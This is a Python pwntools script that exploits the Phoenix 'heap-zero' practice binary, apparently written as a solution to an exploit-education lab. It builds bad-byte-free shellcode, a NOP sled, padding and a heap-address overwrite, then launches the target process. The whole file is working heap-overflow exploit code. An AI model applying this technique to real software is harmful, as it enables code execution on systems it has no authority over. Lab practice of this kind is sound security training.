#!/usr/bin/env python
from pwn import *

SLED_LENGTH = 15    # Arbitrary length of a sled
BUFFER_LEN = 80 # Space of buffer until we overflow target addr
WINNER_FUNC = 0x400abd    # Addr of winner() -- has bad chars so we need to calculate
BEG_HEAP = 0x7ffff7ef6010   # Addr of the start of heap segment we control
                            # we will jump to this 

# * Build shellcode to load partial addr of winner() then add value to it to avoid bad bytes
# * We can't use "mov eax" either because that contains null-bytes which will be removed by us later
# * build the payload using "mov ax" and doing math on the registers to get the desired address

# xor eax, eax
# mov ax, 0x40
# shl eax, 0x10
# mov ax, 0x0abd
# jmp eax

# print(f"Subtracted 0xf0 from winner() addr: {(safe_winner)}")
sc = asm('xor eax, eax')
sc += asm('mov al, 0x40')
sc += asm('shl eax, 0x10')
sc += asm('mov ax, 0x0abd')
sc += asm('jmp eax')
print(disasm(sc))

payload = asm('nop') * SLED_LENGTH
payload += sc
payload += b'A' * (BUFFER_LEN - len(sc) - SLED_LENGTH)
payload += p64(BEG_HEAP)

# print(pwnlib.encoders.encoder.encode(payload, b'\x00', force=True))
# print(f"Payload before null removal: {payload}")

if b"\x00" in payload:
    print("[+] Removing null bytes!")
    payload = payload.replace(b"\x00", b"")
else:
    print("[+] No null bytes were removed")

# print(f"Payload after null removal: {payload}")
# print(len(payload))
# with open("./heap-zero-payload", "wb") as fd:
#     fd.write(payload)

p = process(["/opt/phoenix/amd64/heap-zero", payload])
print(p.recvall())
